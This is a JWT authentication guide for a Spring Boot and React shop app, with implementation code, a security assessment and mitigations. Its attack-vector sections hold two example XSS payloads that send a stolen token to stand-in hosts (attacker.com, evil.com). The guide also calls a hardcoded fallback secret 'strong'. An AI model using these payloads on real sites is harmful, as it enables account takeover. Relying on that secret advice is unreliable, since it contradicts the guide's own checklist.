# JWT (JSON Web Token) - Complete Guide

A comprehensive guide covering JWT fundamentals, implementation in this Sweet Shop application, security analysis, and best practices.

---

## Table of Contents

1. [JWT Basics](#1-jwt-basics)
2. [JWT Structure](#2-jwt-structure)
3. [How JWT Works](#3-how-jwt-works)
4. [Implementation in This Project](#4-implementation-in-this-project)
5. [Security Analysis & Vulnerabilities](#5-security-analysis--vulnerabilities)
6. [Attack Vectors & Mitigations](#6-attack-vectors--mitigations)
7. [Best Practices](#7-best-practices)
8. [How to Implement JWT in a New Project](#8-how-to-implement-jwt-in-a-new-project)
9. [JWT vs Sessions](#9-jwt-vs-sessions)
10. [Troubleshooting](#10-troubleshooting)

---

## 1. JWT Basics

### What is JWT?

JWT (JSON Web Token) is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.

### Why Use JWT?

| Feature | Benefit |
|---------|---------|
| **Stateless** | Server doesn't need to store session data |
| **Scalable** | Works across multiple servers without session sharing |
| **Mobile-Friendly** | Works well with mobile apps and SPAs |
| **Cross-Domain** | Can be used across different domains |
| **Self-Contained** | Contains all user information needed |

### JWT vs Traditional Sessions

```
Traditional Session:
┌──────────┐     Login      ┌──────────┐
│  Client  │ ───────────▶   │  Server  │
└──────────┘                └──────────┘
                                  │
                                  ▼ Store session in DB/Memory
                            ┌──────────┐
                            │ Session  │
                            │   Store  │
                            └──────────┘

JWT Authentication:
┌──────────┐     Login      ┌──────────┐
│  Client  │ ───────────▶   │  Server  │
└──────────┘                └──────────┘
     │                            │
     │◀─── JWT Token ─────────────┘
     │                       (No server storage needed)
     ▼
┌──────────┐
│ Store in │
│ Client   │
└──────────┘
```

---

## 2. JWT Structure

A JWT consists of three parts separated by dots (`.`):

```
xxxxx.yyyyy.zzzzz
  │      │      │
  │      │      └── Signature
  │      └── Payload
  └── Header
```

### 2.1 Header

Contains token type and signing algorithm:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Common Algorithms:**
- `HS256` - HMAC with SHA-256 (symmetric key) ← **Used in this project**
- `RS256` - RSA with SHA-256 (asymmetric key)
- `ES256` - ECDSA with SHA-256 (asymmetric key)

### 2.2 Payload (Claims)

Contains the claims (data). Three types of claims:

#### Registered Claims (Standard)
| Claim | Full Name | Description |
|-------|-----------|-------------|
| `iss` | Issuer | Who issued the token |
| `sub` | Subject | Who the token refers to (user ID/email) |
| `aud` | Audience | Who the token is intended for |
| `exp` | Expiration | When the token expires |
| `nbf` | Not Before | When the token becomes valid |
| `iat` | Issued At | When the token was issued |
| `jti` | JWT ID | Unique identifier for the token |

#### This Project's Payload Example:
```json
{
  "sub": "user@example.com",
  "iat": 1704614400,
  "exp": 1704700800
}
```

### 2.3 Signature

Created by encoding header and payload, then signing:

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### Complete JWT Example

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyQGV4YW1wbGUuY29tIiwiaWF0IjoxNzA0NjE0NDAwLCJleHAiOjE3MDQ3MDA4MDB9.signature_here
```

You can decode any JWT at [jwt.io](https://jwt.io) to see its contents (but NOT the secret).

---

## 3. How JWT Works

### Authentication Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         JWT AUTHENTICATION FLOW                          │
└─────────────────────────────────────────────────────────────────────────┘

     CLIENT                                              SERVER
        │                                                   │
        │  1. POST /api/auth/login                          │
        │     {email, password}                             │
        │ ─────────────────────────────────────────────▶    │
        │                                                   │
        │                              2. Validate credentials
        │                                 Generate JWT      │
        │                                                   │
        │  3. Return JWT Token                              │
        │     {accessToken: "eyJ...", user: {...}}          │
        │ ◀─────────────────────────────────────────────    │
        │                                                   │
        │  4. Store token (localStorage)                    │
        │                                                   │
        │  5. GET /api/sweets (Protected Route)             │
        │     Authorization: Bearer eyJ...                  │
        │ ─────────────────────────────────────────────▶    │
        │                                                   │
        │                              6. Validate JWT
        │                                 Extract user info │
        │                                                   │
        │  7. Return protected resource                     │
        │ ◀─────────────────────────────────────────────    │
        │                                                   │
```

---

## 4. Implementation in This Project

### 4.1 Backend Implementation (Spring Boot)

#### Project Dependencies (pom.xml)

```xml
<!-- JWT Dependencies -->
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.12.3</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
```

#### Configuration (application.properties)

```properties
# JWT Configuration
jwt.secret=${JWT_SECRET:mySecretKeyForJWTTokenGenerationThatIsAtLeast256BitsLong2024SweetShop}
jwt.expiration=86400000  # 24 hours in milliseconds
```

#### JwtTokenProvider.java - Token Generation & Validation

```java
@Component
public class JwtTokenProvider {

    @Value("${jwt.secret}")
    private String jwtSecret;

    @Value("${jwt.expiration}")
    private long jwtExpiration;

    // Create signing key from secret
    private SecretKey getSigningKey() {
        byte[] keyBytes = jwtSecret.getBytes(StandardCharsets.UTF_8);
        return Keys.hmacShaKeyFor(keyBytes);
    }

    // Generate JWT token
    public String generateToken(String email) {
        Date now = new Date();
        Date expiryDate = new Date(now.getTime() + jwtExpiration);

        return Jwts.builder()
                .subject(email)           // Set user email as subject
                .issuedAt(now)            // Set issue time
                .expiration(expiryDate)   // Set expiration
                .signWith(getSigningKey()) // Sign with secret key
                .compact();
    }

    // Extract email from token
    public String getEmailFromToken(String token) {
        Claims claims = Jwts.parser()
                .verifyWith(getSigningKey())
                .build()
                .parseSignedClaims(token)
                .getPayload();

        return claims.getSubject();
    }

    // Validate token
    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                    .verifyWith(getSigningKey())
                    .build()
                    .parseSignedClaims(token);
            return true;
        } catch (JwtException | IllegalArgumentException e) {
            return false;  // Invalid, expired, or malformed token
        }
    }
}
```

#### JwtAuthenticationFilter.java - Request Filter

```java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider jwtTokenProvider;
    private final CustomUserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        try {
            // Extract JWT from Authorization header
            String jwt = extractJwtFromRequest(request);

            // Validate and set authentication
            if (StringUtils.hasText(jwt) && jwtTokenProvider.validateToken(jwt)) {
                String email = jwtTokenProvider.getEmailFromToken(jwt);
                UserDetails userDetails = userDetailsService.loadUserByUsername(email);

                UsernamePasswordAuthenticationToken authentication =
                        new UsernamePasswordAuthenticationToken(
                                userDetails,
                                null,
                                userDetails.getAuthorities()
                        );

                authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                SecurityContextHolder.getContext().setAuthentication(authentication);
            }
        } catch (Exception e) {
            logger.error("Cannot set user authentication", e);
        }

        filterChain.doFilter(request, response);
    }

    private String extractJwtFromRequest(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);  // Remove "Bearer " prefix
        }
        return null;
    }
}
```

#### SecurityConfig.java - Security Configuration

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // Disable CSRF (not needed for stateless JWT)
            .csrf(AbstractHttpConfigurer::disable)
            
            // Configure CORS
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            
            // Set session management to STATELESS (important for JWT!)
            .sessionManagement(session -> session
                    .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            
            // Configure endpoint authorization
            .authorizeHttpRequests(auth -> auth
                    .requestMatchers("/auth/**").permitAll()  // Public
                    .requestMatchers(HttpMethod.GET, "/sweets/**").permitAll()
                    .requestMatchers(HttpMethod.POST, "/sweets").hasRole("ADMIN")
                    .anyRequest().authenticated())
            
            // Add JWT filter before username/password filter
            .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);  // Strong hashing with cost factor 12
    }
}
```

#### AuthService.java - Login/Register Logic

```java
@Service
public class AuthService {

    public AuthResponse login(LoginRequest request) {
        // Find user by email
        User user = userRepository.findByEmail(request.getEmail())
                .orElseThrow(BadCredentialsException::new);

        // Verify password
        if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
            throw new BadCredentialsException();
        }

        // Generate JWT token
        String token = jwtTokenProvider.generateToken(user.getEmail());

        // Return response with token and user info
        return AuthResponse.builder()
                .accessToken(token)
                .tokenType("Bearer")
                .expiresIn(jwtExpiration / 1000)
                .user(userResponse)
                .build();
    }
}
```

### 4.2 Frontend Implementation (React)

#### api.js - Axios Interceptors

```javascript
import axios from 'axios';

const api = axios.create({
  baseURL: process.env.REACT_APP_API_URL || 'http://localhost:8080/api',
  headers: { 'Content-Type': 'application/json' },
});

// Add token to every request
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Handle 401 (unauthorized) errors
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      localStorage.removeItem('token');
      localStorage.removeItem('user');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);
```

#### AuthContext.js - Authentication State Management

```javascript
export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);

  // Restore session on page load
  useEffect(() => {
    const storedUser = localStorage.getItem('user');
    const storedToken = localStorage.getItem('token');
    if (storedUser && storedToken) {
      setUser(JSON.parse(storedUser));
    }
  }, []);

  // Login function
  const login = async (email, password) => {
    const response = await authAPI.login(email, password);
    const { accessToken, user: userData } = response.data;
    
    // Store token and user in localStorage
    localStorage.setItem('token', accessToken);
    localStorage.setItem('user', JSON.stringify(userData));
    setUser(userData);
    
    return userData;
  };

  // Logout function
  const logout = () => {
    localStorage.removeItem('token');
    localStorage.removeItem('user');
    setUser(null);
  };
};
```

---

## 5. Security Analysis & Vulnerabilities

### Current Implementation Security Assessment

| Aspect | Status | Notes |
|--------|--------|-------|
| Token Signing | ✅ Good | Uses HMAC-SHA256 |
| Secret Key Length | ✅ Good | 256+ bits |
| Token Expiration | ✅ Good | 24 hours |
| Stateless Sessions | ✅ Good | `SessionCreationPolicy.STATELESS` |
| Password Hashing | ✅ Good | BCrypt with cost factor 12 |
| CSRF Protection | ✅ Good | Disabled (not needed with JWT) |
| CORS Configuration | ⚠️ Moderate | Configured but allows credentials |
| Token Storage | ⚠️ Risk | localStorage (XSS vulnerable) |
| No Refresh Tokens | ⚠️ Risk | Users re-login after expiry |
| No Token Blacklist | ⚠️ Risk | Cannot invalidate tokens |
| HTTPS | ❓ Unknown | Should be enforced in production |

### 5.1 Token Storage Vulnerability (XSS Risk)

**Current Implementation:**
```javascript
localStorage.setItem('token', accessToken);  // ⚠️ XSS VULNERABLE
```

**Risk:** If an attacker injects JavaScript (XSS attack), they can steal the token:
```javascript
// Attacker's malicious script
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

**Recommended Fix - Use HttpOnly Cookies:**
```java
// Backend: Set token in HttpOnly cookie
ResponseCookie cookie = ResponseCookie.from("jwt", token)
    .httpOnly(true)      // Cannot be accessed by JavaScript
    .secure(true)        // Only sent over HTTPS
    .sameSite("Strict")  // Prevents CSRF
    .path("/")
    .maxAge(Duration.ofHours(24))
    .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
```

### 5.2 No Token Revocation

**Current Issue:** Once a JWT is issued, it cannot be invalidated until expiration.

**Attack Scenario:**
1. User logs in, gets JWT
2. JWT is stolen
3. User changes password
4. Stolen JWT still works!

**Recommended Fix - Token Blacklist:**
```java
@Service
public class TokenBlacklistService {
    private final Set<String> blacklist = ConcurrentHashMap.newKeySet();
    
    public void blacklist(String token) {
        blacklist.add(token);
    }
    
    public boolean isBlacklisted(String token) {
        return blacklist.contains(token);
    }
}

// In JwtAuthenticationFilter
if (tokenBlacklistService.isBlacklisted(jwt)) {
    throw new InvalidTokenException("Token has been revoked");
}
```

---

## 6. Attack Vectors & Mitigations

### 6.1 Session Hijacking / Token Theft

**Attack:** Attacker steals JWT and impersonates the user.

**How it can happen in this app:**
1. **XSS Attack** - Token stored in localStorage is accessible via JavaScript
2. **Man-in-the-Middle** - If HTTPS not enforced
3. **Physical Access** - Someone views browser storage

**Current Vulnerability Level: MEDIUM**

**Mitigations:**
| Mitigation | Status | Priority |
|------------|--------|----------|
| Use HttpOnly cookies | ❌ Not implemented | HIGH |
| Enforce HTTPS | ❓ Unknown | HIGH |
| Short token expiration | ⚠️ 24h (could be shorter) | MEDIUM |
| IP binding | ❌ Not implemented | LOW |
| Device fingerprinting | ❌ Not implemented | LOW |

### 6.2 Cross-Site Scripting (XSS)

**Attack:** Inject malicious scripts to steal tokens.

**Example Attack:**
```html
<!-- In a user input field that's not sanitized -->
<img src="x" onerror="fetch('https://evil.com?t='+localStorage.getItem('token'))">
```

**Current Protection:**
- React auto-escapes JSX content ✅
- No dangerouslySetInnerHTML usage (verify)

**Recommended Additions:**
```java
// Add Content Security Policy header
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; script-src 'self'"))
);
```

### 6.3 Cross-Site Request Forgery (CSRF)

**Attack:** Trick user into making unwanted requests.

**Current Protection:** ✅ GOOD
- JWT in Authorization header (not auto-sent like cookies)
- CORS configured
- SameSite cookie policy (if cookies used)

### 6.4 JWT Algorithm Attacks

**Attack Types:**

#### 6.4.1 None Algorithm Attack
```json
// Attacker changes header to:
{"alg": "none", "typ": "JWT"}
```
**Protection:** ✅ GOOD - jjwt library rejects `none` algorithm

#### 6.4.2 Algorithm Confusion (RS256 → HS256)
**Attack:** Server expects RS256 (asymmetric), attacker signs with HS256 using public key.
**Protection:** ✅ GOOD - This app uses HS256 only

### 6.5 Brute Force / Secret Key Attacks

**Attack:** Guess the secret key to forge tokens.

**Current Protection:**
- ✅ Secret key is 256+ bits
- ✅ Uses environment variable in production

**Verify Secret Strength:**
```bash
# Weak (vulnerable):
jwt.secret=secret123

# Strong (current implementation):
jwt.secret=mySecretKeyForJWTTokenGenerationThatIsAtLeast256BitsLong2024SweetShop
```

### 6.6 Token Replay Attack

**Attack:** Reuse a valid token after user should be logged out.

**Vulnerability:** ⚠️ MEDIUM
- No token blacklist
- No refresh token rotation

**Mitigation Code:**
```java
// Add JTI (JWT ID) for token tracking
return Jwts.builder()
    .id(UUID.randomUUID().toString())  // Unique token ID
    .subject(email)
    .issuedAt(now)
    .expiration(expiryDate)
    .signWith(getSigningKey())
    .compact();
```

---

## 7. Best Practices

### 7.1 Token Security Checklist

```
✅ DO:
├── Use strong secrets (256+ bits)
├── Set reasonable expiration times
├── Use HTTPS in production
├── Implement refresh tokens
├── Store tokens in HttpOnly cookies
├── Validate all claims
├── Use standard libraries (don't roll your own)
└── Keep secrets in environment variables

❌ DON'T:
├── Store tokens in localStorage (XSS risk)
├── Use weak secrets
├── Set very long expiration times
├── Put sensitive data in payload (it's not encrypted!)
├── Trust the client
├── Use 'none' algorithm
└── Hardcode secrets in source code
```

### 7.2 Recommended Token Expiration Strategy

```
┌─────────────────────────────────────────────────────────────┐
│                 TOKEN EXPIRATION STRATEGY                   │
├─────────────────────────────────────────────────────────────┤
│  Access Token:  15 minutes - 1 hour                         │
│  Refresh Token: 7 days - 30 days (stored securely)          │
│                                                             │
│  Flow:                                                      │
│  1. Login → Get Access Token + Refresh Token                │
│  2. Access Token expires                                    │
│  3. Use Refresh Token to get new Access Token               │
│  4. Refresh Token rotation (issue new refresh on use)       │
└─────────────────────────────────────────────────────────────┘
```

### 7.3 Production Configuration

```properties
# application-prod.properties
jwt.secret=${JWT_SECRET}  # Must be set in environment!
jwt.expiration=3600000    # 1 hour (not 24)

# Force HTTPS
server.ssl.enabled=true
```

---

## 8. How to Implement JWT in a New Project

### Step-by-Step Guide

#### Step 1: Add Dependencies

**Maven (pom.xml):**
```xml
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.12.3</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
```

**Gradle:**
```groovy
implementation 'io.jsonwebtoken:jjwt-api:0.12.3'
runtimeOnly 'io.jsonwebtoken:jjwt-impl:0.12.3'
runtimeOnly 'io.jsonwebtoken:jjwt-jackson:0.12.3'
```

#### Step 2: Configure Properties

```properties
jwt.secret=${JWT_SECRET:your-256-bit-secret-key-here-make-it-long-enough}
jwt.expiration=3600000
```

#### Step 3: Create JwtTokenProvider

```java
@Component
public class JwtTokenProvider {
    
    @Value("${jwt.secret}")
    private String secret;
    
    @Value("${jwt.expiration}")
    private long expiration;
    
    public String generateToken(String username) {
        return Jwts.builder()
            .subject(username)
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(Keys.hmacShaKeyFor(secret.getBytes()))
            .compact();
    }
    
    public String extractUsername(String token) {
        return Jwts.parser()
            .verifyWith(Keys.hmacShaKeyFor(secret.getBytes()))
            .build()
            .parseSignedClaims(token)
            .getPayload()
            .getSubject();
    }
    
    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                .verifyWith(Keys.hmacShaKeyFor(secret.getBytes()))
                .build()
                .parseSignedClaims(token);
            return true;
        } catch (JwtException e) {
            return false;
        }
    }
}
```

#### Step 4: Create JWT Filter

```java
@Component
public class JwtFilter extends OncePerRequestFilter {
    
    @Autowired
    private JwtTokenProvider jwtProvider;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain chain)
            throws ServletException, IOException {
        
        String header = request.getHeader("Authorization");
        
        if (header != null && header.startsWith("Bearer ")) {
            String token = header.substring(7);
            
            if (jwtProvider.validateToken(token)) {
                String username = jwtProvider.extractUsername(token);
                UserDetails user = userDetailsService.loadUserByUsername(username);
                
                UsernamePasswordAuthenticationToken auth = 
                    new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());
                SecurityContextHolder.getContext().setAuthentication(auth);
            }
        }
        
        chain.doFilter(request, response);
    }
}
```

#### Step 5: Configure Security

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private JwtFilter jwtFilter;
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(sm -> sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()
                .anyRequest().authenticated())
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
            .build();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

#### Step 6: Create Auth Controller

```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @Autowired
    private AuthService authService;
    
    @PostMapping("/login")
    public ResponseEntity<AuthResponse> login(@RequestBody LoginRequest request) {
        return ResponseEntity.ok(authService.login(request));
    }
    
    @PostMapping("/register")
    public ResponseEntity<AuthResponse> register(@RequestBody RegisterRequest request) {
        return ResponseEntity.status(HttpStatus.CREATED)
            .body(authService.register(request));
    }
}
```

---

## 9. JWT vs Sessions

| Feature | JWT | Server Sessions |
|---------|-----|-----------------|
| **Storage** | Client-side | Server-side |
| **Scalability** | Excellent (stateless) | Requires session sharing |
| **Performance** | No DB lookup needed | DB lookup for each request |
| **Revocation** | Difficult | Easy |
| **Size** | Larger (payload in token) | Small session ID |
| **Security** | Token theft = full access | Session fixation attacks |
| **Cross-domain** | Easy | Requires configuration |
| **Mobile support** | Excellent | Requires cookies/headers |

### When to Use JWT
- Microservices architecture
- Mobile applications
- Single Page Applications (SPAs)
- Third-party API authentication
- Stateless requirements

### When to Use Sessions
- Traditional web applications
- Need immediate logout/revocation
- Sensitive data that shouldn't be in token
- Server has session management infrastructure

---

## 10. Troubleshooting

### Common Issues

#### 1. "JWT signature does not match"
```
Cause: Secret key mismatch between token generation and validation
Fix: Ensure same secret is used everywhere
```

#### 2. "JWT expired"
```
Cause: Token expiration time has passed
Fix: Implement refresh token mechanism or re-login
```

#### 3. "401 Unauthorized" on all requests
```
Causes:
- Token not being sent in Authorization header
- "Bearer " prefix missing
- Token format incorrect

Debug:
console.log('Token:', localStorage.getItem('token'));
console.log('Header:', config.headers.Authorization);
```

#### 4. CORS errors with JWT
```
Fix: Ensure Authorization header is in allowedHeaders:
configuration.setAllowedHeaders(Arrays.asList("Authorization", "Content-Type"));
```

### Debugging JWT

**Decode token (without verification):**
```java
// For debugging only - don't use in production!
String[] parts = token.split("\\.");
String payload = new String(Base64.getDecoder().decode(parts[1]));
System.out.println(payload);
```

**Online tool:** https://jwt.io

---

## Quick Reference

### API Endpoints (This Project)

| Endpoint | Method | Auth | Description |
|----------|--------|------|-------------|
| `/api/auth/register` | POST | ❌ | Register new user |
| `/api/auth/login` | POST | ❌ | Login, get JWT |
| `/api/sweets` | GET | ❌ | List all sweets |
| `/api/sweets` | POST | 🔐 Admin | Create sweet |
| `/api/sweets/{id}` | PUT | 🔐 Admin | Update sweet |
| `/api/sweets/{id}` | DELETE | 🔐 Admin | Delete sweet |
| `/api/sweets/{id}/purchase` | POST | 🔐 User | Purchase sweet |

### Request/Response Examples

**Login Request:**
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "password": "password123"}'
```

**Login Response:**
```json
{
  "accessToken": "eyJhbGciOiJIUzI1NiJ9...",
  "tokenType": "Bearer",
  "expiresIn": 86400,
  "user": {
    "id": "uuid",
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe",
    "role": "USER"
  }
}
```

**Authenticated Request:**
```bash
curl -X GET http://localhost:8080/api/sweets \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9..."
```

---

## Summary

This Sweet Shop application implements JWT authentication with:

✅ **Good Practices:**
- Strong HMAC-SHA256 signing
- Stateless session management
- BCrypt password hashing
- Role-based authorization
- CORS configuration

⚠️ **Areas for Improvement:**
- Token storage (localStorage → HttpOnly cookies)
- Add refresh token mechanism
- Implement token blacklist for logout
- Shorter access token expiration

The implementation provides a solid foundation but should be enhanced with the recommended security improvements before production deployment.

---

*Document created: January 2026*
*Applicable to: Sweet Shop API v1.0.0*
